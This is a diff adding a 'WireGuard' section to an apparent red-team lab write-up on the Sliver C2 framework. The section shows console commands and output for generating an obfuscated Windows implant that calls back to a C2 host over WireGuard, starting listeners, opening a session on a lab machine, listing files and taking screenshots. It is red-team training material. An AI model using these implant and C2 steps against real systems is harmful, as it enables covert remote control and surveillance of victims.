@@ -513,5 +513,72 @@ sliver (SICK_CRECHE) > tasks
 [*] Screenshot written to /tmp/screenshot_DESKTOP-R6MQCK6_20250528085105_266791135.png (110.7 KiB)
 ```
 
+## WireGuard
+
+```
+sliver > generate --os windows --arch amd64 --format exe --save /tmp/implant-wireguard.exe --wg sliver.carabiner.local,172.16.76.128
+
+[*] Generated unique ip for wg peer tun interface: 100.64.0.2
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 30s
+[*] Implant saved to /tmp/implant-wireguard.exe
+```
+
+```
+sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile 
+==== ====== ========== ====== ===============
+ 3    mtls   tcp        8888                 
+
+sliver > jobs --kill 3
+
+[*] Killing job #3 ...
+[*] Successfully killed job #3
+
+[!] Job #3 stopped (tcp/mtls)
+
+sliver > mtls
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #4
+```
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wg-broken.png)
+
+```
+sliver > wg
+
+[*] Starting Wireguard listener ...
+[*] Successfully started job #5
+
+[*] Session 317d6dda TRAGIC_BLOUSE - 100.64.0.3:31662 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 09:19:52 EDT
+
+sliver > use
+
+? Select a session or beacon: SESSION  317d6dda  TRAGIC_BLOUSE     100.64.0.3:31662     DESKTOP-R6MQCK6  DESKTOP-R6MQCK6\win10  windows/amd64
+[*] Active session TRAGIC_BLOUSE (317d6dda-fe3e-4135-b81e-be7066a8e6db)
+
+sliver (TRAGIC_BLOUSE) > ls
+
+C:\Users\win10\Downloads (6 items, 147.3 MiB)
+=============================================
+-rw-rw-rw-  COLD_INCIDENT.exe        15.1 MiB  Mon May 26 09:57:53 +0900 2025
+-rw-rw-rw-  desktop.ini              282 B     Mon May 26 00:16:50 +0900 2025
+-rw-rw-rw-  implant-domain-ip.exe    15.1 MiB  Wed May 28 21:31:48 +0900 2025
+-rw-rw-rw-  implant-wireguard.exe    18.8 MiB  Wed May 28 22:13:25 +0900 2025
+-rw-rw-rw-  TRADITIONAL_GIFT.exe     15.1 MiB  Mon May 26 11:55:42 +0900 2025
+-rw-rw-rw-  Wireshark-4.4.6-x64.exe  83.3 MiB  Wed May 28 20:23:54 +0900 2025
+
+
+sliver (TRAGIC_BLOUSE) > screenshot
+
+[*] Screenshot written to /tmp/screenshot_DESKTOP-R6MQCK6_20250528092024_3007256778.png (107.9 KiB)
+
+[*] Session 4271778f TRAGIC_BLOUSE - 100.64.0.5:58265 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 09:20:38 EDT
+```
+
 ## References
 - https://dominicbreuker.com/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/
